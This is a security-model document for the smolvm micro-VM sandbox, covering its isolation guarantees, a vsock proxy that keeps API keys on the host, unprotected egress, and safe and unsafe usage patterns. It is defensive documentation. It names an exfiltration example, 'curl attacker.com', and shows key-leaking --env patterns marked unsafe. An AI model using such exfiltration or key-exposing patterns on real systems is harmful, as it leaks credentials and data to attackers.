# smolvm Security Model

## TL;DR

smolvm provides **strong compute isolation** (hardware VM boundary) and **secret isolation via a vsock reverse proxy**. When using `--secret`, real API keys never enter the VM — the sandbox gets placeholder keys and a local proxy URL. There is no outbound network filtering beyond this.

**Safe pattern:** Use `--secret` for API keys (keys stay on host). Use `network: false` when possible. Don't pass real keys via `--env` to sandboxes running untrusted code.

---

## What's protected

Each sandbox is a **libkrun micro VM** — a real virtual machine with its own kernel, not a container. This provides hardware-level isolation via Hypervisor.framework (macOS) or KVM (Linux).

| Property | Status | Verified |
|---|---|---|
| Host filesystem invisible | Protected | `/Users`, `/System`, `.env` not accessible |
| Cross-sandbox filesystem | Isolated | Sandboxes can't see each other's files |
| Separate kernel | Yes | Each VM runs its own Linux kernel |
| Separate process namespace | Yes | `ps` only shows VM processes |
| Cloud metadata blocked | Yes | 169.254.169.254 unreachable |
| Network off by default | Yes | No connectivity unless `network: true` |
| Env vars between exec calls | Isolated | Don't persist between calls |
| Resource limits (CPU/memory) | Enforced | Configurable per sandbox |
| Fork bomb protection | Enforced | RLIMIT_NPROC 256 soft / 512 hard |
| API authentication | Available | Bearer token on all `/api/v1/*` routes |
| Non-root exec | Available | setuid/setgid via `--user` flag |

**The VM boundary is the isolation boundary.** Root inside the VM is normal — the security comes from the hypervisor preventing escape.

## What's NOT protected

### 1. Secrets via --env are visible (use --secret instead)

When you pass env vars via `--env KEY=VALUE`, the code inside the sandbox sees the real value. **Use `--secret` instead** — the secret proxy keeps real keys on the host.

```bash
# UNSAFE: --env passes real key into VM
smolctl sh my-vm "echo $ANTHROPIC_API_KEY" --env ANTHROPIC_API_KEY=sk-real
# prints the real key — code can exfiltrate it

# SAFE: --secret uses proxy (real key never enters VM)
smolctl up my-vm --secret anthropic
smolctl sh my-vm "echo $ANTHROPIC_API_KEY"
# prints smolvm-placeholder — useless for exfiltration
# API calls via SDK still work (proxy injects real key on host side)
```

When `--secret` is active, env vars matching protected names (e.g. `ANTHROPIC_API_KEY`) are automatically stripped from exec calls even if the user tries to pass them via `--env`.

See "Secret Proxy Architecture" below for how this works.

### 2. No outbound network filtering

When `network: true`, the sandbox has **unrestricted internet access**. There is no:
- Domain allowlist enforcement (config exists, not enforced — TSI bypasses netfilter)
- HTTP request inspection or secret scrubbing
- DNS filtering
- Egress rate limiting

Code can `curl`, `wget`, or open sockets to any address.

### 3. VM can reach host services via TSI

libkrun's TSI (Transparent Socket Impersonation) proxies socket syscalls through the host network stack. When `network: true`, the sandbox can reach:

- **smolvm API on port 8080** — mitigated by bearer token auth (if enabled)
- **Any host service** — databases, dev servers, other APIs on localhost
- **Other machines on the LAN**

TSI operates below netfilter, so iptables rules inside the VM have no effect.

### 4. No secret lifecycle management

There is no mechanism to:
- Rotate secrets without restarting sandboxes
- Audit which sandboxes have which secrets
- Revoke a secret after it's been passed to a sandbox
- Scope secrets to specific outbound hosts

---

## How other platforms compare

| | smolvm | Deno Sandbox | Fly Sprites | Cloudflare | OpenSandbox |
|---|---|---|---|---|---|
| **Isolation** | Micro VM (hardware) | Micro VM | Micro VM | Container | Container |
| **Secret visibility** | Placeholder only (--secret) | Placeholder only | Real keys in env | Proxy-injected | Real keys in env |
| **Secret masking** | vsock reverse proxy | Network-level swap | None | Partial (proxy) | None |
| **Egress filtering** | None (planned) | Per-host allowlist | None | None | FQDN allowlist + nftables |
| **Can code exfiltrate keys?** | No (with --secret) | No | Yes | Partially | Blocked by egress filter |
| **Host access** | Via TSI (mitigated by auth) | No | No | No | No |
| **Exfiltration risk** | Low (--secret) / High (--env) | Lowest | High | Medium | Medium |

**Deno Sandbox** has the strongest secret model: placeholder tokens that resolve only at the network proxy level.

**smolvm** now matches Deno's model via vsock reverse proxy. Real keys never enter the VM when using `--secret`. The `--env` path still passes raw values — use `--secret` for untrusted code.

**OpenSandbox** (Alibaba) has the strongest egress model: FQDN-based DNS proxy + nftables enforcement.

---

## Secret Proxy Architecture

The secret proxy keeps real API keys on the host. The VM only sees placeholder values.

```
VM (untrusted code)                    Host (trusted)
-----------------                      --------------
SDK: ANTHROPIC_BASE_URL=
  http://localhost:9800/anthropic
  ANTHROPIC_API_KEY=smolvm-placeholder
         |
         v
[Guest proxy: 127.0.0.1:9800]
  Strips /anthropic prefix
  Pipes bytes over vsock:6100
         |
         v (vsock)
                                       [Host proxy on proxy.sock]
                                         Looks up "anthropic" service
                                         Adds x-api-key: test-ant-real-xxx
                                         Proxies to api.anthropic.com
                                         Streams response back
         |
         v
SDK receives response
(never saw the real key)
```

### How to use

```bash
# Server-level: register your API keys
smolvm serve start --secret anthropic=test-ant-xxx --secret openai=test-proj-yyy
# Or via env: SMOLVM_SECRET_ANTHROPIC=test-ant-xxx

# Per-sandbox: opt in to which secrets are available
smolctl up agent-1 --secret anthropic --secret openai

# Inside the VM, these env vars are auto-set:
#   ANTHROPIC_BASE_URL=http://localhost:9800/anthropic
#   ANTHROPIC_API_KEY=smolvm-placeholder
#   OPENAI_BASE_URL=http://localhost:9800/openai
#   OPENAI_API_KEY=smolvm-placeholder
```

### Security properties

- Real keys never enter the VM (only placeholder + localhost URL)
- Each sandbox gets its own proxy socket (can't talk to other sandboxes' proxies)
- Proxy only forwards to registered service base URLs (not arbitrary destinations)
- Secret names validated at sandbox creation (can't request unconfigured secrets)
- Env vars matching protected names (e.g. `ANTHROPIC_API_KEY`) are auto-stripped from exec calls when secrets are active
- Built-in services: Anthropic (`x-api-key`), OpenAI (`Authorization: Bearer`), Google (`x-goog-api-key`)

### What this does NOT solve

- General egress filtering (code can still `curl attacker.com` with non-secret data)
- Secrets passed via `--env` (user's choice — not recommended for untrusted code)
- Non-HTTP protocols

---

## Safe usage patterns

### Running untrusted / AI-generated code

```bash
# SAFE: no network, no secrets
smolctl up worker --no-network
smolctl cp ./code worker:/workspace/code
smolctl sh worker "cd /workspace/code && npm test"
smolctl cp worker:/workspace/code/results ./results
smolctl down worker
```

No secrets ever enter the sandbox. No network means code can't phone home. Results are pulled back via the API (which runs outside the sandbox).

### Running untrusted code that needs API access (RECOMMENDED)

```bash
# SAFE: secret proxy — keys never enter the VM
smolvm serve start --generate-token --secret anthropic=test-ant-xxx
smolctl up agent-1 --secret anthropic
smolctl cp ./code agent-1:/workspace/code
smolctl sh agent-1 "cd /workspace/code && python run_agent.py"
# Code can call Anthropic API (proxy injects real key on host side)
# echo $ANTHROPIC_API_KEY prints "smolvm-placeholder" — useless
```

### Running trusted code that needs secrets

```bash
# ACCEPTABLE: you trust the code, auth protects the host API
smolvm serve start --generate-token
smolctl up agent-1
smolctl sh agent-1 "npm test" --env API_KEY=sk-xxx
```

The key is visible inside the sandbox, but you trust the code not to exfiltrate it.

### Running untrusted code that needs network

```bash
# RISKY but mitigated: no secrets, network enabled
smolctl up worker
smolctl cp ./code worker:/workspace/code
smolctl sh worker "cd /workspace/code && npm install && npm test"
```

Code can reach the internet but has no secrets to steal. It CAN reach host services via TSI — enable `--api-token` to protect the smolvm API.

### The pattern to AVOID

```bash
# DANGEROUS: secrets via --env + network + untrusted code
smolctl up worker
smolctl sh worker "run-untrusted-agent.sh" --env API_KEY=sk-xxx
# ^^^ untrusted code can exfiltrate the key over the network
# USE --secret INSTEAD
```

---

## What would make this safer

These are architectural improvements, roughly ordered by impact:

### ~~1. Egress proxy with secret scrubbing (like Deno)~~ SHIPPED

**Implemented as the vsock reverse proxy.** Real API keys stay on the host. The VM gets placeholder keys + `*_BASE_URL=http://localhost:9800/<service>`. Guest proxy bridges TCP to vsock, host proxy injects real keys and forwards to the real API.

Built-in services: Anthropic, OpenAI, Google/Gemini. Env vars matching protected key names are auto-stripped from exec calls.

### 2. DNS-based egress filtering (like OpenSandbox)

Run a DNS proxy inside the VM that only resolves allowlisted domains. Block direct IP connections via iptables (if TSI ever switches to virtio-net) or via the DNS proxy refusing resolution.

**Difficulty:** Medium. The DNS proxy approach works even with TSI since DNS queries go through normal sockets. But direct IP connections would still bypass it.

### 3. Host-side pf/nftables rules

On macOS, use `pf` (packet filter) to restrict traffic from the smolvm process. On Linux, use nftables/iptables with cgroup or UID-based matching.

**Difficulty:** Medium. Requires root on the host. macOS pf is less flexible than Linux nftables. May conflict with TSI's socket proxying.

### 4. Env var scoping per outbound host (like Deno)

Pass secrets with a host scope: `--env API_KEY=sk-xxx --env-host API_KEY=api.anthropic.com`. The secret only appears in outbound requests to that host.

**Difficulty:** High. Same transparent proxy requirement as #1.

### 5. Read-only secret injection via files

Instead of env vars, mount secrets as read-only files that are only accessible to specific processes. Less useful for tools that expect `$ENV_VAR` patterns.

**Difficulty:** Low, but limited usefulness.

---

## Current mitigations checklist

For running AI-generated code in smolvm today:

- [x] Use `--no-network` for sandboxes that don't need internet
- [x] Enable `--api-token` or `--generate-token` to protect the host API
- [x] Don't pass real API keys to sandboxes running untrusted code
- [x] Use `--user agent` for non-root execution
- [x] Keep the API on `127.0.0.1`, not `0.0.0.0`
- [x] Use `smolctl cp` to move files in/out instead of mounting host dirs
- [ ] Egress filtering (planned, blocked by TSI)
- [x] Secret proxy via vsock (`--secret` flag, keys never enter VM)
- [x] Env var stripping (protected key names auto-removed from exec when --secret active)
- [ ] Host service isolation (requires TSI changes or host-side firewall)
